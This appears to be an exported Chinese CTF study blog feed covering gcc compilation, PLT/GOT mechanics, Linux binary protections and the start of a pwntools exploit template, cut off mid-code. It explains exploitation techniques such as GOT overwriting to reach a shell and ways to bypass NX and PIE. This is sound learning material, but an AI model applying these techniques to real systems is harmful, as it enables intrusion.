编译指令</h1><p>以 C 语言编写一个简单的 hello.c 程序为例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>​<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处理过程：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux-GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B2.png" alt="Linux-GCC编译过程2.png"></p><ul><li>编译 hello.c，一步到位，默认生成 a.out 可执行文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc hello.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>编译 hello.c，一步到位，并指定生成文件名为 hello 可执行文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc hello.c <span class="token parameter variable">-o</span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>只执行预处理，生成 hello.i 源文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-E</span> hello.c <span class="token parameter variable">-o</span> hello.i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>只执行预处理和编译，生成 hello.s 汇编文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> hello.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>也可以由 hello.i 文件生成 hello.s 汇编文件，即：对预处理文件进行编译</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> hello.i <span class="token parameter variable">-o</span> hello.s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>只执行预处理、编译和汇编，生成 hello.o 目标文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-c</span> hello.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>也可以由 hello.i 或 hello.s 生成 hello.o 目标文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-c</span> hello.i <span class="token parameter variable">-o</span> hello.ogcc <span class="token parameter variable">-c</span> hello.s <span class="token parameter variable">-o</span> hello.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>由 hello.o 目标文件链接成可执行文件 hello</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc hello.o <span class="token parameter variable">-o</span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>按照上述方法生成的可执行文件 hello，在使用 gdb 调试时会显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>No debugging symbols found <span class="token keyword">in</span> hello<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 gcc 希望可执行文件更小、更快，默认是不加调试信息的</p><p><strong>如果想要在编译时产生调试信息，需加上参数 -g</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-g</span> hello.c <span class="token parameter variable">-o</span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="gcc-编译-32-位"><a href="#gcc-编译-32-位" class="headerlink" title="gcc 编译 32 位"></a>gcc 编译 32 位</h1><blockquote><p>gcc 可以指定编译为 32 位程序和 64 位程序，在 64 位机器上默认编译为 64 位程序</p></blockquote><p>在 64 位系统下，安装下列库使 gcc 支持编译 32 位程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc-multilib g++-multilib module-assistant<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在上述 gcc 编译指令中，加上参数 <code>-m32</code> 即可指定编译为 32 位，加上 <code>-m64</code> 即可指定编译为 64 位</p><hr>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLT表和GOT表</title>
      <link href="/posts/29133b28.html"/>
      <url>/posts/29133b28.html</url>
      
        <content type="html"><![CDATA[<h1 id="PLT-表和-GOT-表"><a href="#PLT-表和-GOT-表" class="headerlink" title="PLT 表和 GOT 表"></a>PLT 表和 GOT 表</h1><blockquote><p>由于 Linux 绑定延迟机制，程序动态编译时会采用 PLT 表和 GOT 表进行辅助</p><p><code>PLT 表</code>：<mark>程序链接表</mark> （Procedure Linkage Table）<br><code>GOT 表</code>：<mark>全局偏移表</mark> （Global Offset Table）</p></blockquote><p>这两个表是相对应的，PLT 表中的数据就是 GOT 表中的一个地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20%26%20GOT%E8%A1%A81.png" alt="CTF - Pwn_PLT表 &amp; GOT表1.png"></p><p>以 <code>read()</code> 函数为例：</p><ul><li><code>plt[&#39;read&#39;] -&gt; got[&#39;read&#39;].address</code></li><li><code>got[&#39;read&#39;] -&gt; read.address</code></li></ul><p>由此可知：</p><ul><li>当使用指令 <code>call [rbp]</code> 时，<code>rbp</code> 存储的应该是 <code>got[&#39;read&#39;]</code></li><li>而当使用指令 <code>call rbp</code> 时，<code>rbp</code> 储存的应该是 <code>plt[&#39;read&#39;]</code></li></ul><blockquote><p>PLT 表其实是一个过渡的作用，<mark>PLT 表中只存放 GOT 表项的地址</mark>，而不是函数真实的地址，<mark>函数真实的地址存放在 GOT 表中</mark></p></blockquote><hr><h1 id="地址的调用流程"><a href="#地址的调用流程" class="headerlink" title="地址的调用流程"></a>地址的调用流程</h1><blockquote><p>以 <code>scanf()</code> 函数为例，当 <code>main()</code> 函数开始，会请求 PLT 表中这个函数对应的 GOT 表地址</p></blockquote><ul><li><p><strong>若是第一次调用</strong></p><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT 表跳到 GOT 表中</li><li>由 GOT 表回跳到 PLT 表中，这时候进行压栈，把代表函数的 ID 压栈</li><li>接着跳转到公共的 PLT 表项中</li><li>进入到 GOT 表</li><li>然后 <code>_dl_runtime_resolve</code> 对动态函数进行地址解析和重定位</li><li>把动态函数真实的地址写入到 GOT 表项中，然后执行函数并返回</li></ol></li><li><p><strong>若是第二次调用</strong></p><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT 表跳入到 GOT 表中，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回，例如：<code>call scanf() —&gt; scanf() 的 PLT 表 —&gt; scanf() 的 GOT 表</code></li><li>当进入带有 <code>@plt</code> 标志的函数时，由函数调用跳入到 PLT 表中</li><li>在 PLT 表中找到对应的函数的 GOT 表项地址</li><li>通过 jmp 指令跳转到 GOT 表，得到函数的真实地址</li><li>跳转到真实函数地址执行</li></ol></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20%26%20GOT%E8%A1%A82.png" alt="CTF - Pwn_PLT表 &amp; GOT表2.png"></p><hr><h1 id="IDA-中的体现"><a href="#IDA-中的体现" class="headerlink" title="IDA 中的体现"></a>IDA 中的体现</h1><h2 id="程序段"><a href="#程序段" class="headerlink" title="程序段"></a>程序段</h2><table><thead><tr><th align="left">段名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.got</td><td align="left">GOT 全局偏移表。链接器为外部符号填充的实际偏移表<mark>（全局偏移表有很多种，不仅仅对应 PLT 表，只有 <code>.got.plt</code> 才是我们这里所探讨的，实际上还有 <code>.got.xxx</code> 等）</mark></td></tr><tr><td align="left">.plt</td><td align="left">PLT 程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发链接器去找到所需地址</td></tr><tr><td align="left">.got.plt</td><td align="left">这个是 GOT 专门为 PLT 准备的。也就是说 <mark>.got.plt 中的值是 GOT 的一部分</mark>。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</td></tr><tr><td align="left">.plt.got</td><td align="left"></td></tr></tbody></table><hr><h2 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">mov edi<span class="token punctuation">,</span> offset unk_4006E4mov eax<span class="token punctuation">,</span> <span class="token number">0</span>call __isoc99_scanfmov rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp <span class="token operator">+</span> var_18<span class="token punctuation">]</span>mov rsi<span class="token punctuation">,</span> raxmov edi<span class="token punctuation">,</span> offset format     <span class="token punctuation">;</span> <span class="token string">"%p\n"</span>mov eax<span class="token punctuation">,</span> <span class="token number">0</span>call _printfmov eax<span class="token punctuation">,</span> <span class="token number">0</span>mov rdx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp <span class="token operator">+</span> var_8<span class="token punctuation">]</span>xor rdx<span class="token punctuation">,</span> fs <span class="token operator">:</span> <span class="token number">28</span>hjz <span class="token keyword">short</span> locret_40065A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里 <code>call _printf</code> 并不是跳转到了实际的 <code>_printf</code> 函数的位置，因为在编译时程序并不能确定 <code>printf</code> 函数的地址</p><p>这个 <code>call</code> 指令实际上是相对跳转，跳转到了 PLT 表中的 <code>_printf</code> 项，然后再根据 PLT 表中的地址跳转到 GOT 表，才能获取到实际的 <code>_printf</code> 函数地址，进而执行 <code>printf</code> 函数</p></blockquote><hr><h2 id="IDA-函数名和-pwntools"><a href="#IDA-函数名和-pwntools" class="headerlink" title="IDA 函数名和 pwntools"></a>IDA 函数名和 pwntools</h2><p>以蒸米 Level 5 为例：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">hitcon-level5</a></p><p>IDA 的函数列表：<br><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A83.png" alt="CTF - Pwn_PLT表 &amp; GOT表3.png"></p><p>发现函数名其实有不同的标记：有高亮的和没有高亮的</p><ol><li>IDA 中没有高亮的函数名，代表二进制可执行文件中的符号表，例如：main、一些自定义的函数</li></ol><p><code>main</code> 所在位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A88.png" alt="CTF - Pwn_PLT表 &amp; GOT表8.png"></p><ol start="2"><li>IDA 中有高亮的函数名，代表动态链接库中的函数，例如：write、read</li></ol><p>由于 Linux 的绑定延迟机制，程序编译时会采用两种表进行辅助，一个为 PLT 表，一个为 GOT 表<br>例如：write 函数，可以发现 IDA 中有两个：<code>_write</code> 和 <code>write</code></p><p><code>_write</code> 所在位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A85.png" alt="CTF - Pwn_PLT表 &amp; GOT表5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A87.png" alt="CTF - Pwn_PLT表 &amp; GOT表7.png"></p><p><code>write</code> 所在位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A84.png" alt="CTF - Pwn_PLT表 &amp; GOT表4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_PLT%E8%A1%A8%20&%20GOT%E8%A1%A86.png" alt="CTF - Pwn_PLT表 &amp; GOT表6.png"></p><p>可以看到调用逻辑为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000401030</span> FF <span class="token number">25</span> E2 <span class="token number">2F</span> <span class="token number">00</span> <span class="token number">00</span>             jmp     cs<span class="token operator">:</span>off_404018<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000404018</span> <span class="token number">48</span> <span class="token number">40</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       off_404018 dq offset write<span class="token keyword">extern</span><span class="token operator">:</span><span class="token number">0000000000404048</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       extrn write<span class="token operator">:</span>near<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即：首先调用 <code>_write</code> 跳转到 <code>cs:off_404018</code> 处，然后在 <code>cs:off_404018</code> 处存放的是 <code>offset write</code>；而 <code>offset write</code> 处为 <code>extrn write:near</code>，调用 lib 动态链接库中的 <code>write()</code> 函数</p><p>因此，<code>offset write</code> 存放了真正的 write 函数地址</p><blockquote><p><code>extrn write:near</code> 声明了一个外部符号 <code>write</code>，表示它是在其他模块或文件中定义的，它是一个近地址的符号，可能是一个函数或变量</p><p>通常，这种声明用于告诉汇编器和链接器在连接时需要在其他地方找到 <code>write</code> 的定义。这种外部符号声明允许在当前模块中使用 <code>write</code>，而不必提供它的具体定义</p></blockquote><p>也就是说：<strong>在 IDA 的函数列表中，如果是动态链接库中的函数 （函数名带高亮），<code>_write</code> 指的是 PLT 地址，<code>write</code> 指的是 GOT 地址</strong></p><ol start="3"><li>在 Pwntools 中验证：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level5"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"plt write: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"got write: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"symbols write: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"symbols main: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># plt write:  0x401030</span><span class="token comment"># got write:  0x404018</span><span class="token comment"># symbols write:  0x401030</span><span class="token comment"># symbols main:  0x401153</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>结果：</p><ol><li><code>elf.plt[&#39;write&#39;]</code> 输出的地址为 0x401030，与 IDA 中 <code>_write</code> 地址相同，即 .plt 地址</li><li><code>elf.got[&#39;write&#39;]</code> 输出的地址为 0x404018，该地址存放了真正的 <code>write()</code> 函数地址，在 IDA 中为 <code>write</code> 的 .got.plt 地址</li><li><code>elf.symbols[&#39;write&#39;]</code> 输出的地址为 0x401030，与 <code>write()</code> 函数的 PLT 地址相同</li><li><code>elf.symbols[&#39;main&#39;]</code> 输出的地址为 0x401153，为 <code>main()</code> 函数的地址，与 IDA 中 <code>main()</code> 函数地址相同</li></ol></li><li><p>由此可见：</p><ol><li><code>elf.plt[]</code> 获取动态链接库中的函数的 .plt 地址</li><li><code>elf.got[]</code> 获取动态链接库中的函数的 .got.plt 地址</li><li><code>elf.symbols[]</code> 获取程序本身的函数的地址，用于动态链接库中的函数时，获取的是 PLT 地址</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的保护机制</title>
      <link href="/posts/cfa3ef5.html"/>
      <url>/posts/cfa3ef5.html</url>
      
        <content type="html"><![CDATA[<h1 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B62.png" alt="CTF - Pwn_文件保护机制2.png"></p><hr><h1 id="文件保护机制"><a href="#文件保护机制" class="headerlink" title="文件保护机制"></a>文件保护机制</h1><blockquote><p>在 CTF PWN 中，接触到的文件保护机制主要有五种：</p><ol><li><strong>RELRO</strong> 【GOT写保护】</li><li><strong>Stack</strong> 【Canary 金丝雀】</li><li><strong>NX</strong> 【堆栈不可执行】</li><li><strong>PIE</strong> 【程序代码段、数据段地址随机化】</li><li><strong>ASLR</strong> 【内存地址随机化】</li></ol></blockquote><h2 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h2><blockquote><p>程序架构信息</p></blockquote><p>执行 <code>checksec 文件名</code> 时，也会输出 Arch 信息，但这本身并不是保护机制</p><p>Arch 主要用于判断文件是 64 位还是 32 位，使用 Pwntools 编写 exp 使用 p64 还是 p32</p><hr><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><blockquote><p>通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数</p><p>现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行 Return-to-libc 攻击</p></blockquote><hr><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><blockquote><p>用于加强对二进制程序数据段的保护的技术，在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，所以在安全防护的角度来说应当尽量减少可写的存储区域</p></blockquote><ol><li><code>Partial RELRO（部分开启，GOT 可写）</code>，易受到攻击，例如攻击者可以 atoi.got 为 system.plt，进而输入 <code>/bin/sh\x00</code> 获得 shell</li><li><code>Full RELRO（全部开启，GOT 不可写）</code>，使整个 GOT 表只读，从而无法被覆盖，意味着无法修改 GOT 表。但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ol><hr><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><blockquote><p>栈溢出检查，一种用来防护栈溢出的保护机制</p><p><code>Canary found</code> 表示开启了 Canary 保护，不能直接用溢出的方法覆盖栈中返回地址</p></blockquote><p>原理：</p><ol><li>函数每一次执行时，在栈上随机产生一个 Canary 值</li><li>代码一般在函数的入口处，先从 <code>FS/GS</code> 寄存器中取出一个 4 字节 (eax) 或者 8 字节 (rax) 的值存到栈上，逆向题中的代码经常遇见</li><li>当函数结束时，会检查这个栈上的值是否和存进去的值一致；如果不一致，就会停止程序运行，作用相当于校验信息的 cookie</li></ol><p>一般在覆盖返回地址的时候也会将 Canary 信息给覆盖掉，导致栈保护检查失败，阻止控制程序流程</p><hr><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><blockquote><p>NX 将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令</p></blockquote><p>如果这个保护开启，就意味着栈中数据没有执行权限，程序将数据段和代码段分开了，因此不能将 shellcode 写入栈中并执行；当在堆栈上写入 shellcode 并触发时，只会直接造成程序的崩溃，而不是执行 shellcode</p><p> 一般可以利用 ROP 的方式绕过</p><hr><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><blockquote><p>PIE 在编译时将程序编译为位置无关，程序运行的各个段加载的虚拟地址在装载时确定（地址随机化），主要针对 <code>.text（代码段）</code>，<code>.data（数据段）</code>，<code>.bss（未初始化全局变量段）</code> 进行地址随机化的保护</p></blockquote><p>最终决定是否随机化看 ASLR ，如果 ASLR 是关闭的，那么就算开启了 PIE 也不会进行地址随机化</p><p><strong>程序在开启 PIE 后，IDA 中看到的地址是偏移量 <code>offset</code>，真实地址 &#x3D; 基地址 + 偏移量</strong></p><blockquote><p>由于内存的分页管理机制，即使地址随机化，只能影响到单个内存页，一个内存页大小为 <code>0x1000</code>，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数是始终不变的，也就是<strong>地址的低三位不会发生改变</strong>。有时可以利用这一点对地址进行爆破</p><p>绕过方式：地址泄露、<code>partial write</code></p></blockquote><hr><h2 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h2><blockquote><p>读写权限</p></blockquote><table><thead><tr><th align="left">权限</th><th align="left">解释</th><th></th></tr></thead><tbody><tr><td align="left"><strong>r</strong></td><td align="left">对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限</td><td></td></tr><tr><td align="left"><strong>w</strong></td><td align="left">对文件而言，具有新增、修改、删除文件内容的权限；对目录而言，具有新建、删除、修改、移动目录内文件的权限</td><td></td></tr><tr><td align="left"><strong>x</strong></td><td align="left">对文件而言，具有执行文件的权限；对目录而言该用户具有进入目录的权限</td><td></td></tr></tbody></table><ol><li><strong>目录的只读访问不允许使用 <code>cd</code> 进入目录</strong>，必须要有执行的权限才能进入</li><li><strong>只有执行权限只能进入目录，不能看到目录下的内容</strong>；要想看到目录下的文件名和目录名，需要可读权限</li><li><strong>一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限</strong>，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外</li><li>目录的 <strong>w</strong> 位不设置，即使拥有目录中某文件的 <strong>w</strong> 权限也不能写该文件</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools与exp技巧</title>
      <link href="/posts/487911c5.html"/>
      <url>/posts/487911c5.html</url>
      
        <content type="html"><![CDATA[<h1 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h1><table><thead><tr><th align="left">名称</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>exploit（简称 exp）</strong></td><td align="left">用于攻击的脚本与方案</td></tr><tr><td align="left"><strong>payload</strong></td><td align="left">攻击载荷，是对目标进程劫持控制流的数据</td></tr><tr><td align="left"><strong>shellcode</strong></td><td align="left">调用攻击目标的 shell 的代码</td></tr></tbody></table><blockquote><p><em>问：poc 与 exp 有什么区别？</em><br>在 CVE 漏洞中通常出现 poc，poc 与 exp 类似，但是 poc 只是一种证明，证明存在 CVE 漏洞即可，而 exp 是需要攻击漏洞达成特定的目的</p></blockquote><hr><h1 id="分析二进制程序"><a href="#分析二进制程序" class="headerlink" title="分析二进制程序"></a>分析二进制程序</h1><ol><li>查看二进制文件类型</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">file</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B61.png" alt="CTF - Pwn_文件保护机制1.png"></p><ol start="2"><li>查看程序保护</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B62.png" alt="CTF - Pwn_文件保护机制2.png"></p><ol start="3"><li>查看 ELF 格式的文件信息，可详细显示各程序段的信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">readelf <span class="token parameter variable">-a</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B63.png" alt="CTF - Pwn_文件保护机制3.png"></p><p>其他参数可使用 <code>readelf -h</code> 查看</p><ol start="4"><li>查看二进制程序的符号表</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nm 文件名 <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B64.png" alt="CTF - Pwn_文件保护机制4.png"></p><ol start="5"><li>查看二进制文件的十六进制编码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump 文件名 <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B65.png" alt="CTF - Pwn_文件保护机制5.png"></p><ol start="6"><li>查看程序 glibc 版本和位置</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldd 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B66.png" alt="CTF - Pwn_文件保护机制6.png"></p><blockquote><p>ldd 不是一个可执行程序，而是通过 <code>ld-linux.so</code> (ELF 动态库的装载器) 来实现的</p></blockquote><hr><h1 id="exp-编写"><a href="#exp-编写" class="headerlink" title="exp 编写"></a>exp 编写</h1><blockquote><p>exp 就是我们用于漏洞攻击的整个脚本，一个脚本中可能会涉及到多个漏洞的利用，每一个漏洞构造一个 payload 进行利用</p></blockquote><h2 id="exp-脚本模板"><a href="#exp-脚本模板" class="headerlink" title="exp 脚本模板"></a>exp 脚本模板</h2><blockquote><p>注意养成好的书写习惯（<strong>适用于 python 11 及以下版本，在 python 12 中需有所改动</strong>）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token 